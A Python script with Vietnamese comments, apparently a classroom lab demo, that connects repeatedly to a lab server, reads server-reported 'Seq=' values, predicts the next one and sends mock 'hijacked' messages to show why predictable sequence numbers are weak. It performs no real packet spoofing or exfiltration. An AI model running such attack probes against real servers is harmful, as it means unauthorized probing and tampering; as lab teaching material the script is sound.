import socket
import time
import threading

class TCPSequenceAttacker:
    def __init__(self, target_ip='192.168.100.2', target_port=8080):
        self.target_ip = target_ip
        self.target_port = target_port
        self.observed_sequences = []
        self.observed_sessions = []
        self.pattern_analysis = {}
        self.attack_success = False
        
    def network_reconnaissance(self):
        """Kiểm tra kết nối đến target server"""
        print(f"[ATTACKER] 🕵️ Kiểm tra kết nối đến {self.target_ip}:{self.target_port}")
        
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(10)
            result = sock.connect_ex((self.target_ip, self.target_port))
            sock.close()
            
            if result == 0:
                print(f"[ATTACKER] ✅ Target server có thể kết nối được")
                return True
            else:
                print(f"[ATTACKER] ❌ Không thể kết nối đến target server")
                return False
        except Exception as e:
            print(f"[ATTACKER] ❌ Lỗi kiểm tra kết nối: {e}")
            return False
    
    def observe_session_sequences(self, num_sessions=6):
        """Quan sát sequence numbers qua nhiều session riêng biệt"""
        print(f"\n[ATTACKER] 🔍 Bắt đầu quan sát TCP sequence patterns...")
        print(f"[ATTACKER] Tạo {num_sessions} session riêng biệt để phân tích...")
        
        for session_num in range(num_sessions):
            try:
                print(f"\n[ATTACKER] 📊 === SESSION {session_num + 1} ===")
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.connect((self.target_ip, self.target_port))
                
                # Gửi tin nhắn thăm dò
                probe_msg = f"Reconnaissance probe session #{session_num + 1}"
                print(f"[ATTACKER] 📤 Gửi: {probe_msg}")
                sock.send(probe_msg.encode())
                
                # Nhận phản hồi và phân tích
                sock.settimeout(10.0)
                response = sock.recv(1024).decode()
                print(f"[ATTACKER] 📥 Nhận: {response}")
                
                # Trích xuất sequence number từ phản hồi
                if "Seq=" in response:
                    seq_part = response.split("Seq=")[1].split(",")[0]
                    sequence = int(seq_part)
                    
                    session_info = {
                        'session_num': session_num + 1,
                        'sequence': sequence,
                        'message_length': len(probe_msg.encode()),
                        'response': response
                    }
                    
                    self.observed_sessions.append(session_info)
                    self.observed_sequences.append(sequence)
                    
                    print(f"[ATTACKER] 🔢 Sequence trích xuất: {sequence}")
                    print(f"[ATTACKER] 📏 Message length: {len(probe_msg.encode())} bytes")
                
                sock.close()
                time.sleep(2)  # Delay giữa các session
                
            except Exception as e:
                print(f"[ATTACKER] ❌ Session {session_num + 1} thất bại: {e}")
        
        return len(self.observed_sequences) >= 3
    
    def analyze_server_pattern(self):
        """Phân tích pattern cụ thể của server dựa trên code đã biết"""
        if len(self.observed_sequences) < 3:
            print("[ATTACKER] ❌ Không đủ dữ liệu để phân tích pattern")
            return False
        
        print(f"\n[ATTACKER] 📈 PHÂN TÍCH PATTERN SERVER:")
        print(f"[ATTACKER] Số sessions quan sát: {len(self.observed_sessions)}")
        
        # Hiển thị chi tiết từng session
        for session in self.observed_sessions:
            print(f"[ATTACKER] Session {session['session_num']}: Seq={session['sequence']}, MsgLen={session['message_length']}")
        
        # Phân tích pattern base sequence + increment
        sequences = self.observed_sequences
        print(f"[ATTACKER] Sequences: {sequences}")
        
        # Tính initial sequences (trước khi cộng message length)
        initial_sequences = []
        for i, session in enumerate(self.observed_sessions):
            # Sequence hiện tại - message length = initial sequence cho session đó
            initial_seq = session['sequence'] - session['message_length']
            initial_sequences.append(initial_seq)
            print(f"[ATTACKER] Session {i+1} initial sequence: {initial_seq}")
        
        # Phân tích increment pattern giữa các session
        if len(initial_sequences) >= 2:
            increments = []
            for i in range(1, len(initial_sequences)):
                increment = initial_sequences[i] - initial_sequences[i-1]
                increments.append(increment)
            
            print(f"[ATTACKER] Session increments: {increments}")
            
            # Kiểm tra pattern cố định
            if len(set(increments)) <= 1:
                common_increment = increments[0] if increments else 100
                base_sequence = initial_sequences[0]
                
                self.pattern_analysis = {
                    'predictable': True,
                    'base_sequence': base_sequence,
                    'session_increment': common_increment,
                    'pattern_type': 'linear_session_based'
                }
                
                print(f"[ATTACKER] ✅ PHÁT HIỆN PATTERN CỐ ĐỊNH!")
                print(f"[ATTACKER] 🎯 Base sequence: {base_sequence}")
                print(f"[ATTACKER] 📈 Session increment: {common_increment}")
                print(f"[ATTACKER] 🔍 Pattern: base + (session_count * increment) + message_length")
                return True
        
        self.pattern_analysis = {'predictable': False}
        print(f"[ATTACKER] ⚠️ Không phát hiện pattern rõ ràng")
        return False
    
    def predict_next_session_sequence(self):
        """Dự đoán sequence cho session tiếp theo"""
        if not self.pattern_analysis.get('predictable', False):
            print("[ATTACKER] ❌ Không thể dự đoán sequence")
            return None
        
        base_seq = self.pattern_analysis['base_sequence']
        session_increment = self.pattern_analysis['session_increment']
        next_session_number = len(self.observed_sessions)
        
        # Dự đoán initial sequence cho session tiếp theo
        predicted_initial = base_seq + (next_session_number * session_increment)
        
        print(f"\n[ATTACKER] 🔮 DỰ ĐOÁN CHO SESSION TIẾP THEO:")
        print(f"[ATTACKER] Base: {base_seq}")
        print(f"[ATTACKER] Session #{next_session_number + 1} increment: {next_session_number} * {session_increment} = {next_session_number * session_increment}")
        print(f"[ATTACKER] Predicted initial sequence: {predicted_initial}")
        
        return predicted_initial
    
    def test_sequence_prediction(self, predicted_initial):
        """Test độ chính xác của dự đoán sequence"""
        print(f"\n[ATTACKER] 🧪 TEST DỰ ĐOÁN SEQUENCE:")
        
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.connect((self.target_ip, self.target_port))
            
            test_message = "Testing sequence prediction accuracy"
            predicted_final = predicted_initial + len(test_message.encode())
            
            print(f"[ATTACKER] 📤 Gửi test message: {test_message}")
            print(f"[ATTACKER] 🎯 Dự đoán sequence sau khi gửi: {predicted_final}")
            
            sock.send(test_message.encode())
            
            sock.settimeout(10.0)
            response = sock.recv(1024).decode()
            print(f"[ATTACKER] 📥 Response: {response}")
            
            if "Seq=" in response:
                actual_sequence = int(response.split("Seq=")[1].split(",")[0])
                print(f"[ATTACKER] 🎯 Sequence thực tế: {actual_sequence}")
                print(f"[ATTACKER] 🎯 Sequence dự đoán: {predicted_final}")
                
                accuracy = abs(actual_sequence - predicted_final)
                if accuracy == 0:
                    print(f"[ATTACKER] ✅ DỰ ĐOÁN HOÀN TOÀN CHÍNH XÁC!")
                    self.attack_success = True
                elif accuracy <= 10:
                    print(f"[ATTACKER] ✅ DỰ ĐOÁN GẦN CHÍNH XÁC! (Sai số: {accuracy})")
                    self.attack_success = True
                else:
                    print(f"[ATTACKER] ❌ Dự đoán sai (Sai số: {accuracy})")
            
            sock.close()
            
        except Exception as e:
            print(f"[ATTACKER] ❌ Lỗi test prediction: {e}")
    
    def simulate_session_hijacking(self, predicted_initial):
        """Mô phỏng tấn công session hijacking"""
        print(f"\n[ATTACKER] 🚀 MÔ PHỎNG SESSION HIJACKING:")
        
        attack_messages = [
            "HIJACKED: This session has been compromised!",
            "ATTACK: Unauthorized access detected!",
            "SPOOFED: Malicious payload injected!"
        ]
        
        for i, attack_msg in enumerate(attack_messages):
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.connect((self.target_ip, self.target_port))
                
                # Tính sequence dự đoán cho attack message
                predicted_seq = predicted_initial + len(attack_msg.encode())
                
                print(f"\n[ATTACKER] 📤 Attack #{i+1}: {attack_msg}")
                print(f"[ATTACKER] 🎯 Predicted sequence: {predicted_seq}")
                
                sock.send(attack_msg.encode())
                
                sock.settimeout(10.0)
                response = sock.recv(1024).decode()
                print(f"[ATTACKER] 📥 Server response: {response}")
                
                # Kiểm tra server có phát hiện tấn công không
                if "🚨" in response or "CẢNH BÁO" in response:
                    print(f"[ATTACKER] ⚠️ Server đã phát hiện attack message!")
                else:
                    print(f"[ATTACKER] ✅ Attack message được server chấp nhận!")
                
                sock.close()
                time.sleep(1)
                
                # Cập nhật predicted_initial cho attack tiếp theo
                predicted_initial += 100  # Session increment
                
            except Exception as e:
                print(f"[ATTACKER] ❌ Attack #{i+1} thất bại: {e}")
    
    def run_complete_attack_demo(self):
        """Chạy demo tấn công hoàn chỉnh"""
        print("=" * 80)
        print("🎯 TCP SEQUENCE NUMBER PREDICTION ATTACK DEMO")
        print("=" * 80)
        print(f"Target Server: {self.target_ip}:{self.target_port}")
        print("Mục tiêu: Phân tích và dự đoán TCP sequence numbers")
        print("Phương pháp: Quan sát pattern server và test prediction")
        print("=" * 80)
        
        # Bước 1: Reconnaissance
        if not self.network_reconnaissance():
            print("[ATTACKER] ❌ Không thể kết nối đến server. Demo thất bại.")
            return
        
        # Bước 2: Quan sát sequences
        print(f"\n{'='*25} BƯỚC 1: QUAN SÁT SEQUENCES {'='*25}")
        if not self.observe_session_sequences(6):
            print("[ATTACKER] ❌ Không thu thập đủ dữ liệu. Demo thất bại.")
            return
        
        # Bước 3: Phân tích pattern
        print(f"\n{'='*25} BƯỚC 2: PHÂN TÍCH PATTERN {'='*25}")
        if not self.analyze_server_pattern():
            print("[ATTACKER] ❌ Không phát hiện pattern dự đoán được.")
            return
        
        # Bước 4: Dự đoán sequence
        print(f"\n{'='*25} BƯỚC 3: DỰ ĐOÁN SEQUENCE {'='*25}")
        predicted = self.predict_next_session_sequence()
        if not predicted:
            print("[ATTACKER] ❌ Không thể tạo dự đoán.")
            return
        
        # Bước 5: Test prediction
        print(f"\n{'='*25} BƯỚC 4: TEST DỰ ĐOÁN {'='*25}")
        self.test_sequence_prediction(predicted)
        
        # Bước 6: Simulate attack
        if self.attack_success:
            print(f"\n{'='*25} BƯỚC 5: MÔ PHỎNG TẤNG CÔNG {'='*25}")
            self.simulate_session_hijacking(predicted + 100)  # Next session
        
        # Kết luận
        print(f"\n{'='*80}")
        if self.attack_success:
            print("🎉 DEMO THÀNH CÔNG!")
            print("✅ Đã chứng minh được lỗ hổng TCP sequence prediction")
            print("⚠️ Server sử dụng sequence pattern dễ dự đoán:")
            print(f"   - Base sequence: {self.pattern_analysis.get('base_sequence', 'N/A')}")
            print(f"   - Session increment: {self.pattern_analysis.get('session_increment', 'N/A')}")
            print("🔒 Khuyến nghị: Sử dụng random sequence numbers")
        else:
            print("ℹ️ DEMO HOÀN TẤT")
            print("📊 Đã phân tích sequence patterns nhưng không dự đoán chính xác")
            print("🔒 Server có thể đã được bảo vệ tốt hơn")
        
        print("=" * 80)

def main():
    print("=== MÁY B - TCP SEQUENCE PREDICTION ATTACKER ===")
    print("Chức năng: Demo lỗ hổng TCP sequence prediction")
    print("Target: Server với pattern sequence dễ đoán")
    print("Phương pháp: Phân tích pattern qua multiple sessions")
    
    attacker = TCPSequenceAttacker(
        target_ip='192.168.100.2',  # IP của Server
        target_port=8080
    )
    
    print(f"\nTarget: {attacker.target_ip}:{attacker.target_port}")
    input("Nhấn Enter để bắt đầu demo tấn công...")
    
    attacker.run_complete_attack_demo()

if __name__ == "__main__":
    main()
